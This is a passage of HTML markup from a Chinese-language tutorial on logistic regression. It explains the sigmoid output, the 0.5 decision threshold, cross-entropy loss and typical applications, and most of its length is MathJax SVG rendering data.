rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo stretchy="false">^</mo></mover></mrow><mo>=</mo><mi>σ</mi><mo stretchy="false">(</mo><mi>z</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mrow><mn>1</mn><mo>+</mo><msup><mi>e</mi><mrow data-mjx-texclass="ORD"><mo>−</mo><mi>z</mi></mrow></msup></mrow></mfrac></math></mjx-assistive-mml></mjx-container><ol start="3"><li>分类决策：</li></ol><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="40.178ex" height="2.296ex" role="img" focusable="false" viewbox="0 -810 17758.7 1015" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="2C6" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(767.8,0)"><path data-c="2265" d="M83 616Q83 624 89 630T99 636Q107 636 253 568T543 431T687 361Q694 356 694 346T687 331Q685 329 395 192L107 56H101Q83 58 83 76Q83 77 83 79Q82 86 98 95Q117 105 248 167Q326 204 378 228L626 346L360 472Q291 505 200 548Q112 589 98 597T83 616ZM84 -118Q84 -108 99 -98H678Q694 -104 694 -118Q694 -130 679 -138H98Q84 -131 84 -118Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1823.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" style="stroke-width: 3;"/><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)" style="stroke-width: 3;"/><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(778,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3379.3,0)"><path data-c="21D2" d="M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(4657.1,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">预</text></g><g data-mml-node="mi" transform="translate(5657.1,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">测</text></g><g data-mml-node="mi" transform="translate(6657.1,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">为</text></g><g data-mml-node="mn" transform="translate(7657.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(8157.1,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">类</text></g><g data-mml-node="mspace" transform="translate(9157.1,0)"><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(9157.1,0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="2C6" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mtext" transform="translate(9647.1,0)"><path data-c="3C" d="M694 -11T694 -19T688 -33T678 -40Q671 -40 524 29T234 166L90 235Q83 240 83 250Q83 261 91 266Q664 540 678 540Q681 540 687 534T694 519T687 505Q686 504 417 376L151 250L417 124Q686 -4 687 -5Q694 -11 694 -19Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(10425.1,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" style="stroke-width: 3;"/><path data-c="2E" d="M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z" transform="translate(500,0)" style="stroke-width: 3;"/><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(778,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(11980.9,0)"><path data-c="21D2" d="M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(13258.7,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">预</text></g><g data-mml-node="mi" transform="translate(14258.7,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">测</text></g><g data-mml-node="mi" transform="translate(15258.7,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">为</text></g><g data-mml-node="mn" transform="translate(16258.7,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(16758.7,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">类</text></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo>^</mo></mover></mrow><mo>≥</mo><mn>0.5</mn><mo stretchy="false">⇒</mo><mi mathvariant="normal">预</mi><mi mathvariant="normal">测</mi><mi mathvariant="normal">为</mi><mn>1</mn><mi mathvariant="normal">类</mi><mspace linebreak="newline"><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo>^</mo></mover></mrow><mtext>&lt;</mtext><mn>0.5</mn><mo stretchy="false">⇒</mo><mi mathvariant="normal">预</mi><mi mathvariant="normal">测</mi><mi mathvariant="normal">为</mi><mn>0</mn><mi mathvariant="normal">类</mi></mspace></math></mjx-assistive-mml></mjx-container><h3 id="直观理解">直观理解</h3><p>想象你要判断一个人是否患有某种病：</p><ul><li>你拿到他的一些指标（如年龄、血压、体重）。</li><li>把这些指标带入模型，模型输出一个概率，比如 0.82。</li><li>表示这个人有 82% 的概率患病，于是你预测他&quot;患病&quot;。</li></ul><h3 id="损失函数：交叉熵损失">损失函数：交叉熵损失</h3><p>逻辑回归使用 <strong>交叉熵（Cross Entropy）损失函数</strong>来衡量预测与真实标签的差距：</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="37.175ex" height="2.398ex" role="img" focusable="false" viewbox="0 -810 16431.2 1060" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mtext"><path data-c="4C" d="M128 622Q121 629 117 631T101 634T58 637H25V683H36Q48 680 182 680Q324 680 348 683H360V637H333Q273 637 258 635T233 622L232 342V129Q232 57 237 52Q243 47 313 47Q384 47 410 53Q470 70 498 110T536 221Q536 226 537 238T540 261T542 272T562 273H582V268Q580 265 568 137T554 5V0H25V46H58Q100 47 109 49T128 61V622Z" style="stroke-width: 3;"/><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(625,0)" style="stroke-width: 3;"/><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(1125,0)" style="stroke-width: 3;"/><path data-c="73" d="M295 316Q295 356 268 385T190 414Q154 414 128 401Q98 382 98 349Q97 344 98 336T114 312T157 287Q175 282 201 278T245 269T277 256Q294 248 310 236T342 195T359 133Q359 71 321 31T198 -10H190Q138 -10 94 26L86 19L77 10Q71 4 65 -1L54 -11H46H42Q39 -11 33 -5V74V132Q33 153 35 157T45 162H54Q66 162 70 158T75 146T82 119T101 77Q136 26 198 26Q295 26 295 104Q295 133 277 151Q257 175 194 187T111 210Q75 227 54 256T33 318Q33 357 50 384T93 424T143 442T187 447H198Q238 447 268 432L283 424L292 431Q302 440 314 448H322H326Q329 448 335 442V310L329 304H301Q295 310 295 316Z" transform="translate(1519,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2190.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3246.6,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(4024.6,0)"><path data-c="5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(4302.6,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(4959.2,0)"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z" style="stroke-width: 3;"/><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)" style="stroke-width: 3;"/><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6237.2,0)"><path data-c="2061" d="" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(6237.2,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(6626.2,0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="5E" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(7116.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(7727.4,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(8727.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(9116.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(9838.9,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(10839.1,0)"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(11329.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(11884.8,0)"><path data-c="6C" d="M42 46H56Q95 46 103 60V68Q103 77 103 91T103 124T104 167T104 217T104 272T104 329Q104 366 104 407T104 482T104 542T103 586T103 603Q100 622 89 628T44 637H26V660Q26 683 28 683L38 684Q48 685 67 686T104 688Q121 689 141 690T171 693T182 694H185V379Q185 62 186 60Q190 52 198 49Q219 46 247 46H263V0H255L232 1Q209 2 183 2T145 3T107 3T57 1L34 0H26V46H42Z" style="stroke-width: 3;"/><path data-c="6F" d="M28 214Q28 309 93 378T250 448Q340 448 405 380T471 215Q471 120 407 55T250 -10Q153 -10 91 57T28 214ZM250 30Q372 30 372 193V225V250Q372 272 371 288T364 326T348 362T317 390T268 410Q263 411 252 411Q222 411 195 399Q152 377 139 338T126 246V226Q126 130 145 91Q177 30 250 30Z" transform="translate(278,0)" style="stroke-width: 3;"/><path data-c="67" d="M329 409Q373 453 429 453Q459 453 472 434T485 396Q485 382 476 371T449 360Q416 360 412 390Q410 404 415 411Q415 412 416 414V415Q388 412 363 393Q355 388 355 386Q355 385 359 381T368 369T379 351T388 325T392 292Q392 230 343 187T222 143Q172 143 123 171Q112 153 112 133Q112 98 138 81Q147 75 155 75T227 73Q311 72 335 67Q396 58 431 26Q470 -13 470 -72Q470 -139 392 -175Q332 -206 250 -206Q167 -206 107 -175Q29 -140 29 -75Q29 -39 50 -15T92 18L103 24Q67 55 67 108Q67 155 96 193Q52 237 52 292Q52 355 102 398T223 442Q274 442 318 416L329 409ZM299 343Q294 371 273 387T221 404Q192 404 171 388T145 343Q142 326 142 292Q142 248 149 227T179 192Q196 182 222 182Q244 182 260 189T283 207T294 227T299 242Q302 258 302 292T299 343ZM403 -75Q403 -50 389 -34T348 -11T299 -2T245 0H218Q151 0 138 -6Q118 -15 107 -34T95 -74Q95 -84 101 -97T122 -127T170 -155T250 -167Q319 -167 361 -139T403 -75Z" transform="translate(778,0)" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(13162.8,0)"><path data-c="2061" d="" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(13162.8,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(13551.8,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(14274,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(15274.2,0)"><g data-mml-node="mover"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(300.6,16) translate(-250 0)"><path data-c="5E" d="M112 560L249 694L257 686Q387 562 387 560L361 531Q359 532 303 581L250 627L195 580Q182 569 169 557T148 538L140 532Q138 530 125 546L112 560Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(15764.2,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(16153.2,0)"><path data-c="5D" d="M22 710V750H159V-250H22V-210H119V710H22Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mtext>Loss</mtext><mo>=</mo><mo>−</mo><mo stretchy="false">[</mo><mi>y</mi><mi>log</mi><mo data-mjx-texclass="NONE">⁡</mo><mo stretchy="false">(</mo><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo stretchy="false">^</mo></mover></mrow><mo stretchy="false">)</mo><mo>+</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mi>y</mi><mo stretchy="false">)</mo><mi>log</mi><mo data-mjx-texclass="NONE">⁡</mo><mo stretchy="false">(</mo><mn>1</mn><mo>−</mo><mrow data-mjx-texclass="ORD"><mover><mi>y</mi><mo stretchy="false">^</mo></mover></mrow><mo stretchy="false">)</mo><mo stretchy="false">]</mo></math></mjx-assistive-mml></mjx-container><p>这个函数对概率接近真实值的预测给予更低的惩罚，对错误预测惩罚大。</p><h3 id="应用场景">应用场景</h3><ul><li><p>垃圾邮件分类</p></li><li><p>用户是否会点击广告</p></li><li><p>信用卡欺诈检测</p></li><li><p>医疗诊断（是否患病）</p></li></ul><h3 id="实验代码">实验代码</h3><p>实验代码参考<sup class="footnote-ref"><a href="#fn1" id="fnref1">[1]</a></sup></p><h2 